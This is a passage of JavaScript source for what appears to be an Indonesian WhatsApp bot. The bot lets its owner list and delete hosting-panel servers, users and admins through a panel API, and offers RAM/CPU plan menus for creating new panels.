                    header: `🗑️ 𝗗𝗘𝗟𝗘𝗧𝗘 𝗨𝗦𝗘𝗥 𝗣𝗔𝗡𝗘𝗟 𝗩${i + 1}`,
                    title: `Hapus User Panel Di Server Ke-${i + 1}`,
                    id: `${prefix}res_deluser${i + 1}`
                }))
            }
        ];

        const buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "🛠️ Pilih Server" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
                }
            }
        ];

        const buttonMessage = {
            document: fs.readFileSync("./package.json"),
            mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            caption: teksnya,
            fileName: "𝗦𝗟𝗘𝗕𝗘𝗪",
            footer: botname,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    thumbnailUrl: global.image.panel,
                    title: `✨ Powered By ${namaOwner}`,
                    renderLargerThumbnail: true,
                    sourceUrl: global.linkGrup,
                    mediaType: 1
                }
            }
        };

        await Putzz.sendMessage(m.chat, buttonMessage, { quoted: m });
    } catch (error) {
        console.error("❌ Error in deluser:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "res_delpanel1": case "res_delpanel2": case "res_delpanel3": case "res_delpanel4": case "res_delpanel5":
case "res_delpanel6": case "res_delpanel7": case "res_delpanel8": case "res_delpanel9": case "res_delpanel10":
case "res_delpanel11": case "res_delpanel12": case "res_delpanel13": case "res_delpanel14": case "res_delpanel15":
case "res_delpanel16": case "res_delpanel17": case "res_delpanel18": case "res_delpanel19": case "res_delpanel20": {
    if (!isCreator) return;

    const version = parseInt(command.replace("res_delpanel", ""));
    const domain = global[`domain${version}`];
    const apikey = global[`apikey${version}`];
    const capikey = global[`capikey${version}`];
    const versinya = `SERVER KE-${version}`;

    async function fetchAllPages(url, headers) {
        let allData = [];
        let page = 1;
        let hasMore = true;

        while (hasMore) {
            let response = await fetch(`${url}?page=${page}`, { method: "GET", headers });
            let json = await response.json();

            if (json.data && json.data.length > 0) {
                allData = allData.concat(json.data);
                page++;
            } else {
                hasMore = false;
            }
        }
        return allData;
    }

    let servers = await fetchAllPages(`${domain}/api/application/servers`, {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": `Bearer ${apikey}`
    });

    if (!text) {
        if (servers.length < 1) return ReplyLanz("⚠️ Tidak ada server bot yang tersedia!");

        let list = [];
        for (let s of servers) {
            let f3 = await fetch(`${domain}/api/client/servers/${s.attributes.uuid.split("-")[0]}/resources`, {
                "method": "GET",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${capikey}`
                }
            });

            let data = await f3.json();
            let status = data.attributes ? data.attributes.current_state : s.attributes.status;

            list.push({
                title: `🖥️ ${s.attributes.name} (ID: ${s.attributes.id})`,
                description: `RAM: ${s.attributes.limits.memory}MB | Disk: ${s.attributes.limits.disk}MB | CPU: ${s.attributes.limits.cpu}% | Status: ${status}`,
                id: `${prefix}res_delpanel${version} ${s.attributes.id}`
            });
        }

        return Putzz.sendMessage(m.chat, {
            buttons: [{
                buttonId: "action",
                buttonText: { displayText: "🛠️ Pilih Server" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({
                        title: "PILIH SERVER PANEL",
                        sections: [{ title: "🔰 List Server Panel", rows: [...list] }]
                    })
                }
            }],
            footer: `*${versinya}*`,
            headerType: 1,
            viewOnce: true,
            text: "Pilih panel yang ingin dihapus ❗",
            contextInfo: {
                isForwarded: true,
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`]
            }
        }, { quoted: qfake });
    }

    let userID, nameSrv;
    for (let s of servers) {
        if (Number(text) == s.attributes.id) {
            userID = s.attributes.user;
            nameSrv = s.attributes.name;

            let delServer = await fetch(`${domain}/api/application/servers/${s.attributes.id}`, {
                "method": "DELETE",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apikey}`
                }
            });

            if (!delServer.ok) return ReplyLanz(`❌ Gagal menghapus server panel *${nameSrv}*`);
        }
    }

    if (!userID) return ReplyLanz("⚠️ Tidak ditemukan user yang memiliki server ini!");

    let users = await fetchAllPages(`${domain}/api/application/users`, {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": `Bearer ${apikey}`
    });

    let targetUser = users.find(u => u.id === userID);

    if (targetUser) {
        let delUser = await fetch(`${domain}/api/application/users/${targetUser.id}`, {
            "method": "DELETE",
            "headers": {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            }
        });

        if (!delUser.ok) return ReplyLanz(`❌ Gagal menghapus user *${targetUser.attributes.first_name}*`);
    }

    await ReplyLanz(`✅ Berhasil menghapus Panel *${nameSrv}*`);
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "res_delserver1": case "res_delserver2": case "res_delserver3": case "res_delserver4": case "res_delserver5":
case "res_delserver6": case "res_delserver7": case "res_delserver8": case "res_delserver9": case "res_delserver10": {
    if (!isCreator) return;
    
    const version = parseInt(command.replace("res_delserver", ""));
    const domain = global[`domain${version}`];
    const apikey = global[`apikey${version}`];
    const capikey = global[`capikey${version}`];
    const versinya = `SERVER KE-${version}`;
    
    async function fetchAllPages(url, headers) {
        let allData = [];
        let page = 1;
        let hasMore = true;

        while (hasMore) {
            try {
                let response = await fetch(`${url}?page=${page}`, { method: "GET", headers });
                if (!response.ok) throw new Error(`Gagal mengambil data (status: ${response.status})`);
                
                let json = await response.json();
                if (!json.data || !Array.isArray(json.data)) throw new Error("Format respons tidak valid");

                if (json.data.length > 0) {
                    allData = allData.concat(json.data);
                    page++;
                } else {
                    hasMore = false;
                }
            } catch (error) {
                console.error("Error saat mengambil data server:", error.message);
                return [];
            }
        }
        return allData;
    }

    let servers = await fetchAllPages(`${domain}/api/application/servers`, {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + apikey
    });

    if (!servers.length) return ReplyLanz("Tidak Ada Server Bot");

    if (!text) {
        let list = [];

        for (let s of servers) {
            try {
                let f3 = await fetch(`${domain}/api/client/servers/${s.attributes.uuid.split`-`[0]}/resources`, {
                    "method": "GET",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + capikey
                    }
                });

                if (!f3.ok) throw new Error(`Gagal mengambil status server (status: ${f3.status})`);

                let data = await f3.json();
                let status = data.attributes ? data.attributes.current_state : s.attributes.status;

                list.push({
                    title: `${s.attributes.name} (ID ${s.attributes.id})`,
                    description: `RAM: ${s.attributes.limits.memory}MB | Disk: ${s.attributes.limits.disk}MB | CPU: ${s.attributes.limits.cpu}%`,
                    id: `${prefix}res_delserver${version} ${s.attributes.id}`
                });
            } catch (error) {
                console.error(`Gagal mendapatkan informasi server ${s.attributes.name}:`, error.message);
            }
        }

        return Putzz.sendMessage(m.chat, {
            buttons: [{
                buttonId: 'action',
                buttonText: { displayText: 'Pilih Server' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜',
                        sections: [{ title: '# List Server Panel', rows: [...list] }]
                    })
                }
            }],
            footer: `*${versinya}*`,
            headerType: 1,
            viewOnce: true,
            text: "Pilih Salah Satu Server Panel\n",
            contextInfo: {
                isForwarded: true,
                mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
            }
        }, { quoted: qfake });
    }

    let serverFound = false;
    let nameSrv = "";

    for (let s of servers) {
        if (Number(text) === s.attributes.id) {
            nameSrv = s.attributes.name;
            serverFound = true;

            try {
                let delServer = await fetch(`${domain}/api/application/servers/${s.attributes.id}`, {
                    "method": "DELETE",
                    "headers": {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                });

                if (!delServer.ok) return ReplyLanz(`Gagal menghapus server panel ${nameSrv}`);
            } catch (error) {
                console.error(`Gagal menghapus server ${nameSrv}:`, error.message);
                return ReplyLanz(`Terjadi kesalahan saat menghapus server ${nameSrv}`);
            }

            break;
        }
    }

    if (!serverFound) return ReplyLanz("Server panel tidak ditemukan!");
    await ReplyLanz(`✅ Berhasil menghapus server panel *${capital(nameSrv)}*`);
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "res_deluser1": case "res_deluser2": case "res_deluser3": case "res_deluser4": case "res_deluser5":
case "res_deluser6": case "res_deluser7": case "res_deluser8": case "res_deluser9": case "res_deluser10": {
    if (!isCreator) return;
    
    const version = parseInt(command.replace("res_deluser", ""));
    const domain = global[`domain${version}`];
    const apikey = global[`apikey${version}`];
    const versinya = `SERVER KE-${version}`;
    
    async function fetchAllUsers() {
        let users = [];
        let page = 1;
        let hasNextPage = true;

        while (hasNextPage) {
            try {
                let response = await fetch(`${domain}/api/application/users?page=${page}`, {
                    method: "GET",
                    headers: {
                        Accept: "application/json",
                        "Content-Type": "application/json",
                        Authorization: `Bearer ${apikey}`,
                    },
                });

                if (!response.ok) throw new Error(`Gagal mengambil data user (status: ${response.status})`);

                let res2 = await response.json();
                if (!res2.data || !Array.isArray(res2.data)) throw new Error("Format respons tidak valid");

                if (res2.data.length > 0) {
                    users = users.concat(res2.data);
                    hasNextPage = res2.meta.pagination.current_page < res2.meta.pagination.total_pages;
                    page++;
                } else {
                    hasNextPage = false;
                }
            } catch (error) {
                console.error("Error saat mengambil data user:", error.message);
                return [];
            }
        }
        return users;
    }

    let users = await fetchAllUsers();
    if (!users.length) return ReplyLanz("Tidak ada user panel yang tersedia.");

    if (!text) {
        let list = users
            .filter(user => !user.attributes.root_admin)
            .map(user => ({
                title: `${user.attributes.first_name} (ID ${user.attributes.id})`,
                id: `${prefix}res_deluser${version} ${user.attributes.id}`,
            }));

        if (!list.length) return ReplyLanz("Tidak ada user non-admin yang tersedia.");

        return Putzz.sendMessage(
            m.chat,
            {
                buttons: [
                    {
                        buttonId: "action",
                        buttonText: { displayText: "Pilih User" },
                        type: 4,
                        nativeFlowInfo: {
                            name: "single_select",
                            paramsJson: JSON.stringify({
                                title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜",
                                sections: [{ title: "# List User Panel", rows: [...list] }],
                            }),
                        },
                    },
                ],
                footer: `*${versinya}*`,
                headerType: 1,
                viewOnce: true,
                text: "\nPilih Salah Satu User Panel\n",
                contextInfo: { isForwarded: true, mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"] },
            },
            { quoted: qfake }
        );
    }

    let userIdToDelete = Number(args[0]);
    if (isNaN(userIdToDelete)) return ReplyLanz("ID user tidak valid!");

    let userToDelete = users.find(user => user.attributes.id === userIdToDelete && !user.attributes.root_admin);
    if (!userToDelete) return ReplyLanz("User panel tidak ditemukan atau merupakan admin!");

    try {
        let delUser = await fetch(`${domain}/api/application/users/${userIdToDelete}`, {
            method: "DELETE",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
        });

        if (!delUser.ok) throw new Error(`Gagal menghapus user (status: ${delUser.status})`);
    } catch (error) {
        console.error(`Gagal menghapus user ${userToDelete.attributes.username}:`, error.message);
        return ReplyLanz(`Terjadi kesalahan saat menghapus user ${userToDelete.attributes.username}`);
    }

    await ReplyLanz(`✅ Berhasil menghapus user panel *${capital(userToDelete.attributes.username)}*`);
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "res_deladmin1": case "res_deladmin2": case "res_deladmin3": case "res_deladmin4": case "res_deladmin5":
case "res_deladmin6": case "res_deladmin7": case "res_deladmin8": case "res_deladmin9": case "res_deladmin10":
case "res_deladmin11": case "res_deladmin12": case "res_deladmin13": case "res_deladmin14": case "res_deladmin15":
case "res_deladmin16": case "res_deladmin17": case "res_deladmin18": case "res_deladmin19": case "res_deladmin20": {
    if (!isCreator) return;
    
    const version = parseInt(command.replace("res_deladmin", ""));
    const domain = global[`domain${version}`];
    const apikey = global[`apikey${version}`];
    const versinya = `SERVER KE-${version}`;
    
    async function fetchAllUsers() {
        let users = [];
        let page = 1;
        let hasNextPage = true;

        while (hasNextPage) {
            try {
                let response = await fetch(`${domain}/api/application/users?page=${page}`, {
                    method: "GET",
                    headers: {
                        Accept: "application/json",
                        "Content-Type": "application/json",
                        Authorization: `Bearer ${apikey}`,
                    },
                });

                if (!response.ok) throw new Error(`Gagal mengambil data user (status: ${response.status})`);

                let res2 = await response.json();
                if (!res2.data || !Array.isArray(res2.data)) throw new Error("Format respons tidak valid");

                if (res2.data.length > 0) {
                    users = users.concat(res2.data);
                    hasNextPage = res2.meta.pagination.current_page < res2.meta.pagination.total_pages;
                    page++;
                } else {
                    hasNextPage = false;
                }
            } catch (error) {
                console.error("Error saat mengambil data user:", error.message);
                return [];
            }
        }
        return users;
    }

    let users = await fetchAllUsers();
    if (!users.length) return ReplyLanz("Tidak ada admin panel yang tersedia.");

    if (!text) {
        let list = users
            .filter(user => user.attributes.root_admin)
            .map(user => ({
                title: `${user.attributes.first_name} (ID ${user.attributes.id})`,
                id: `${prefix}res_deladmin${version} ${user.attributes.id}`,
            }));

        if (!list.length) return ReplyLanz("Tidak ada admin yang dapat dihapus.");

        return Putzz.sendMessage(
            m.chat,
            {
                buttons: [
                    {
                        buttonId: "action",
                        buttonText: { displayText: "Pilih Admin" },
                        type: 4,
                        nativeFlowInfo: {
                            name: "single_select",
                            paramsJson: JSON.stringify({
                                title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜",
                                sections: [{ title: "List Admin Panel", rows: [...list] }],
                            }),
                        },
                    },
                ],
                footer: `*${versinya}*`,
                headerType: 1,
                viewOnce: true,
                text: "\nPilih Salah Satu Admin Panel\n",
                contextInfo: { isForwarded: true, mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"] },
            },
            { quoted: qfake }
        );
    }

    let adminIdToDelete = Number(args[0]);
    if (isNaN(adminIdToDelete)) return ReplyLanz("ID admin tidak valid!");

    let adminToDelete = users.find(user => user.attributes.id === adminIdToDelete && user.attributes.root_admin);
    if (!adminToDelete) return ReplyLanz("Akun admin panel tidak ditemukan!");

    try {
        let delAdmin = await fetch(`${domain}/api/application/users/${adminIdToDelete}`, {
            method: "DELETE",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
        });

        if (!delAdmin.ok) throw new Error(`Gagal menghapus admin (status: ${delAdmin.status})`);
    } catch (error) {
        console.error(`Gagal menghapus admin ${adminToDelete.attributes.username}:`, error.message);
        return ReplyLanz(`Terjadi kesalahan saat menghapus admin ${adminToDelete.attributes.username}`);
    }

    await ReplyLanz(`✅ Berhasil menghapus akun admin panel *${capital(adminToDelete.attributes.username)}*`);
}
break;


case "cpanel2": {
    if (!isOwner && !isUserPremium) return ReplyLanz(mess.prem);

    if (!text) return ReplyLanz(example("username,62xxx"));

    let username, nomor, version;

    if (args[0].includes(",")) {
        let [a, b] = args[0].split(",").map(v => v.trim());
        username = a;
        nomor = m.mentionedJid?.[0]?.split("@")[0] || b?.replace(/[^0-9]/g, "");
        version = args[1]?.trim() || null;
    } else if (m.quoted) {
        let [a, b] = text.split(" ").map(v => v.trim());
        username = a;
        version = b || null;
        nomor = m.quoted.sender.split("@")[0];
    } else {
        return ReplyLanz(example("username,62xxx"));
    }

    if (!username || !nomor) return ReplyLanz(example("username,62xxx"));
    if (!/^[a-z0-9]+$/i.test(username)) return ReplyLanz("⚠️ Username hanya boleh huruf dan angka.");
    if (nomor.startsWith("0")) return ReplyLanz("⚠️ Awalan nomor harus berupa 62, bukan 0!");

    const check = await Putzz.onWhatsApp(nomor);
    if (!check || check.length < 1) return ReplyLanz("⚠️ Nomor tersebut tidak terdaftar di WhatsApp!");

    try {
        if (!version) {
            const teks = "*Pilih Server Untuk Membuat Panel*";

            const sections = [{
                title: "# Silahkan Pilih Server Panel",
                rows: Object.keys(global.cok).map((_, i) => ({
                    title: `𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗩${i + 1}`,
                    description: `${global.cok[`panel${i + 1}`].nama}`,
                    id: `${prefix}cpanel2 ${username},${nomor} ${i + 1}`
                }))
            }];

            const buttons = [{
                buttonId: "action",
                buttonText: { displayText: "🔹 Pilih Server 🔹" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
                }
            }];

            return Putzz.sendMessage(m.chat, {
                document: cukurukuk,
                mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                caption: teks,
                fileName: "𝐋𝐚𝐧𝐳𝐕𝟕",
                footer: `*${botname}*`,
                buttons,
                viewOnce: true,
                headerType: 1,
                contextInfo: {
                    mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                    isForwarded: true,
                    businessMessageForwardInfo: {
                        businessOwnerJid: global.owner + "@s.whatsapp.net"
                    },
                    externalAdReply: {
                        containsAutoReply: true,
                        thumbnailUrl: global.image.panel,
                        title: `✨ Powered By ${namaOwner}`,
                        renderLargerThumbnail: true,
                        sourceUrl: global.linkGrup,
                        mediaType: 1
                    }
                }
            }, { quoted: m });
        }

        const versi = parseInt(version);
        if (isNaN(versi) || !global.cok[`panel${versi}`]) return ReplyLanz("⚠️ Versi server tidak ditemukan.");

        const premium = isPremium[versi];
        if (!isOwner && !premium) return ReplyLanz(`${mess.prem} 𝗩${versi}!`);

        const panel = global.cok[`panel${versi}`];
        if (!panel?.apikey || panel.apikey.length < 43) return ReplyLanz("🚫 *API Key Tidak Valid!*");

        const teks = "*Pilih RAM dan CPU untuk Panel Anda*";

        const specs = [
            { gb: 1, cpu: 40 }, { gb: 2, cpu: 70 }, { gb: 3, cpu: 100 },
            { gb: 4, cpu: 130 }, { gb: 5, cpu: 160 }, { gb: 6, cpu: 190 },
            { gb: 7, cpu: 220 }, { gb: 8, cpu: 250 }, { gb: 9, cpu: 280 },
            { gb: 10, cpu: 320 }
        ];

        const rows = specs.map(x => ({
            title: `RAM ${x.gb} GB | CPU ${x.cpu}%`,
            id: `${prefix}${x.gb}gb2 ${username},${nomor} ${versi}`
        }));

        rows.push({
            title: "RAM ∞ GB | CPU ∞%",
            id: `${prefix}unli2 ${username},${nomor} ${versi}`
        });

        const sections = [{ title: "# Pilih Spesifikasi Panel", rows }];

        const buttons = [{
            buttonId: "action",
            buttonText: { displayText: "🔹 Pilih Spesifikasi 🔹" },
            type: 4,
            nativeFlowInfo: {
                name: "single_select",
                paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
            }
        }];

        await Putzz.sendMessage(m.chat, {
            text: teks,
            footer: `*${panel.nama}*`,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`]
            }
        }, { quoted: qfake });

    } catch (err) {
        console.error("❌ Error in cpanel2:", err);
        return ReplyLanz(`⚠️ Terjadi kesalahan:\n${err.message}`);
    }
}
break;
case "putz_cpanel2v1":
case "putz_cpanel2v2":
case "putz_cpanel2v3":
case "putz_cpanel2v4":
case "putz_cpanel2v5":
case "putz_cpanel2v6":
case "putz_cpanel2v7":
case "putz_cpanel2v8":
case "putz_cpanel2v9":
case "putz_cpanel2v10":
case "putz_cpanel2v11":
case "putz_cpanel2v12":
case "putz_cpanel2v13":
case "putz_cpanel2v14":
case "putz_cpanel2v15":
case "putz_cpanel2v16":
case "putz_cpanel2v17":
case "putz_cpanel2v18":
case "putz_cpanel2v19":
case "putz_cpanel2v20":
case "putz_cpanel2v21":
case "putz_cpanel2v22":
case "putz_cpanel2v23":
case "putz_cpanel2v24":
case "putz_cpanel2v25":
case "putz_cpanel2v26":
case "putz_cpanel2v27":
case "putz_cpanel2v28":
case "putz_cpanel2v29":
case "putz_cpanel2v30":
case "putz_cpanel2v31":
case "putz_cpanel2v32":
case "putz_cpanel2v33":
case "putz_cpanel2v34":
case "putz_cpanel2v35":
case "putz_cpanel2v36":
case "putz_cpanel2v37":
case "putz_cpanel2v38":
case "putz_cpanel2v39":
case "putz_cpanel2v40":
case "putz_cpanel2v41":
case "putz_cpanel2v42":
case "putz_cpanel2v43":
case "putz_cpanel2v44":
case "putz_cpanel2v45":
case "putz_cpanel2v46":
case "putz_cpanel2v47":
case "putz_cpanel2v48":
case "putz_cpanel2v49":
case "putz_cpanel2v50":
case "putz_cpanel2v51":
case "putz_cpanel2v52":
case "putz_cpanel2v53":
case "putz_cpanel2v54":
case "putz_cpanel2v55":
case "putz_cpanel2v56":
case "putz_cpanel2v57":
case "putz_cpanel2v58":
case "putz_cpanel2v59":
case "putz_cpanel2v60":
case "putz_cpanel2v61":
case "putz_cpanel2v62":
case "putz_cpanel2v63":
case "putz_cpanel2v64":
case "putz_cpanel2v65":
case "putz_cpanel2v66":
case "putz_cpanel2v67":
case "putz_cpanel2v68":
case "putz_cpanel2v69":
case "putz_cpanel2v70":
case "putz_cpanel2v71":
case "putz_cpanel2v72":
case "putz_cpanel2v73":
case "putz_cpanel2v74":
case "putz_cpanel2v75":
case "putz_cpanel2v76":
case "putz_cpanel2v77":
case "putz_cpanel2v78":
case "putz_cpanel2v79":
case "putz_cpanel2v80":
case "putz_cpanel2v81":
case "putz_cpanel2v82":
case "putz_cpanel2v83":
case "putz_cpanel2v84":
case "putz_cpanel2v85":
case "putz_cpanel2v86":
case "putz_cpanel2v87":
case "putz_cpanel2v88":
case "putz_cpanel2v89":
case "putz_cpanel2v90":
case "putz_cpanel2v91":
case "putz_cpanel2v92":
case "putz_cpanel2v93":
case "putz_cpanel2v94":
case "putz_cpanel2v95":
case "putz_cpanel2v96":
case "putz_cpanel2v97":
case "putz_cpanel2v98":
case "putz_cpanel2v99":
case "putz_cpanel2v100": {
    let version = command.replace("putz_cpanel2v", "");
//    const isPremium = eval(`isPremium${version}`);

    if (!isOwner && !isUserPremium) return ReplyLanz(mess.prem);
    if (!text || !text.includes(",")) return;
    
    let [usernya, phoneNumber] = text.split(",");
    if (!usernya || !phoneNumber) return;
    if (!/^[a-z0-9]+$/i.test(usernya)) return ReplyLanz("⚠️ Username hanya boleh mengandung huruf dan angka.");
    if (phoneNumber.startsWith("0")) return ReplyLanz("⚠️ Awalan nomor harus berupa kode negara (62xx), bukan 0!");

    const check = await Putzz.onWhatsApp(phoneNumber);
    if (check.length < 1) return ReplyLanz("⚠️ Nomor tersebut tidak terdaftar di WhatsApp!");

  //  const usernya = text.toLowerCase();
    const domain = eval(`domain${version}`);
    const apikey = eval(`apikey${version}`);
    const versinya = `SERVER KE-${version}`;

    if (!domain || !apikey) return ReplyLanz("⚠️ Konfigurasi domain atau API key tidak ditemukan untuk versi ini.");

    try {
        const teksnya = "*Pilih RAM dan CPU yang tersedia untuk Panel Anda*";

        const sections = [
            {
                title: "# Pilih Spesifikasi Panel",
                highlight_label: ``,
                rows: [
                    { title: "RAM 1 GB | CPU 40%", id: `${prefix}1gb2_v${version} ${usernya},${phoneNumber}` },
                    { title: "RAM 2 GB | CPU 70%", id: `${prefix}2gb2_v${version} ${usernya},${phoneNumber}` },
                    { title: "RAM 3 GB | CPU 100%", id: `${prefix}3gb2_v${version} ${usernya}${phoneNumber}` },
                    { title: "RAM 4 GB | CPU 130%", id: `${prefix}4gb2_v${version} ${usernya},${phoneNumber}` },
                    { title: "RAM 5 GB | CPU 160%", id: `${prefix}5gb2_v${version} ${usernya},${phoneNumber}` },
                    { title: "RAM 6 GB | CPU 190%", id: `${prefix}6gb2_v${version} ${usernya},${phoneNumber}` },
                    { title: "RAM 7 GB | CPU 220%", id: `${prefix}7gb2_v${version} ${usernya},${phoneNumber}` },
                    { title: "RAM 8 GB | CPU 250%", id: `${prefix}8gb2_v${version} ${usernya},${phoneNumber}` },
                    { title: "RAM 9 GB | CPU 280%", id: `${prefix}9gb2_v${version} ${usernya},${phoneNumber}` },
                    { title: "RAM 10 GB | CPU 320%", id: `${prefix}10gb2_v${version} ${usernya},${phoneNumber}` },
                    { title: "RAM ∞ GB | CPU ∞%", id: `${prefix}unli2_v${version} ${usernya},${phoneNumber}` }
                ]
            }
        ];

        const buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "🔹 Pilih Spesifikasi 🔹" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
                }
            }
        ];

        const buttonMessage = {
            document: fs.readFileSync("./package.json"),
            mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            caption: teksnya,
            fileName: "𝐂𝐑𝐄𝐀𝐓𝐄 𝐏𝐀𝐍𝐄𝐋𝐋",
            footer: `Versi beta`,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    thumbnailUrl: "https://files.catbox.moe/s8wlw4.jpg",
                    title: `✨ Powered By ${namaOwner}`,
                    renderLargerThumbnail: true,
                    sourceUrl: " https://whatsapp.com/channel/0029Vax8HY61dAwBEIeWbE1G",
                    mediaType: 1
                 }
            }
        };

        await Putzz.sendMessage(m.chat, buttonMessage, { quoted: qfake });
    } catch (error) {
        console.error("❌ Error in putz_cpanelv:", error);
        return ReplyLanz(`⚠️ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;/*
case "putz_cpanel2v11": case "putz_cpanel2v12": case "putz_cpanel2v13": case "putz_cpanel2v14": case "putz_cpanel2v15": 
case "putz_cpanel2v16": case "putz_cpanel2v17": case "putz_cpanel2v18": case "putz_cpanel2v19": case "putz_cpanel2v20": {
    let version = command.replace("putz_cpanel2v", "");
    const isPremium = eval(`isPremium${version}`);

    if (!isOwner && !isPremium) return ReplyLanz(mess.prem);
    if (!text || !text.includes(",")) return;
    
    let [usernya, phoneNumber] = text.split(",");
    if (!usernya || !phoneNumber) return;
    if (!/^[a-z0-9]+$/i.test(usernya)) return ReplyLanz("⚠️ Username hanya boleh mengandung huruf dan angka.");
    if (phoneNumber.startsWith("0")) return ReplyLanz("⚠️ Awalan nomor harus berupa kode negara (62xx), bukan 0!");

    const check = await Putzz.onWhatsApp(phoneNumber);
    if (check.length < 1) return ReplyLanz("⚠️ Nomor tersebut tidak terdaftar di WhatsApp!");

  //  const usernya = text.toLowerCase();
    const domain = eval(`domain${version}`);
    const apikey = eval(`apikey${version}`);
    const versinya = `SERVER KE-${version}`;

    if (!domain || !apikey) return ReplyLanz("⚠️ Konfigurasi domain atau API key tidak ditemukan untuk versi ini.");

    try {
        const teksnya = "*Pilih RAM dan CPU yang tersedia untuk Panel Anda*";

        const sections = [
            {
                title: "# Pilih Spesifikasi Panel",
                highlight_label: ``,
                rows: [
                    { title: "RAM 1 GB | CPU 40%", id: `${prefix}1gb2_v${version} ${usernya},${phoneNumber}` },
                    { title: "RAM 2 GB | CPU 70%", id: `${prefix}2gb2_v${version} ${usernya},${phoneNumber}` },
                    { title: "RAM 3 GB | CPU 100%", id: `${prefix}3gb2_v${version} ${usernya}${phoneNumber}` },
                    { title: "RAM 4 GB | CPU 130%", id: `${prefix}4gb2_v${version} ${usernya},${phoneNumber}` },
                    { title: "RAM 5 GB | CPU 160%", id: `${prefix}5gb2_v${version} ${usernya},${phoneNumber}` },
                    { title: "RAM 6 GB | CPU 190%", id: `${prefix}6gb2_v${version} ${usernya},${phoneNumber}` },
                    { title: "RAM 7 GB | CPU 220%", id: `${prefix}7gb2_v${version} ${usernya},${phoneNumber}` },
                    { title: "RAM 8 GB | CPU 250%", id: `${prefix}8gb2_v${version} ${usernya},${phoneNumber}` },
                    { title: "RAM 9 GB | CPU 280%", id: `${prefix}9gb2_v${version} ${usernya},${phoneNumber}` },
                    { title: "RAM 10 GB | CPU 320%", id: `${prefix}10gb2_v${version} ${usernya},${phoneNumber}` },
                    { title: "RAM ∞ GB | CPU ∞%", id: `${prefix}unli2_v${version} ${usernya},${phoneNumber}` }
                ]
            }
        ];

        const buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "🔹 Pilih Spesifikasi 🔹" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
                }
            }
        ];

        const buttonMessage = {
            document: fs.readFileSync("./package.json"),
            mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            caption: teksnya,
